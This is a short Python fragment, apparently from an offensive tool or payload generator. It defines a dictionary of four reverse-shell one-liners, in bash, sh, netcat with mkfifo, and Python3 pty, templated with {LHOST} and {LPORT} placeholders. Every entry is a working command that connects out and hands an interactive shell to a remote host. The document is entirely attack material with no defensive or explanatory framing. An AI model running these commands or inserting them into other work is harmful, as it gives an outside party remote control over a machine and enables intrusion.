payloads = {
    'bash_tcp': 'bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"',
    'sh_tcp': '0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196',
    'nc_mkfifo': 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f',
    'python3_pty': 'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\'{LHOST}\',{LPORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\'bash\')"',
}
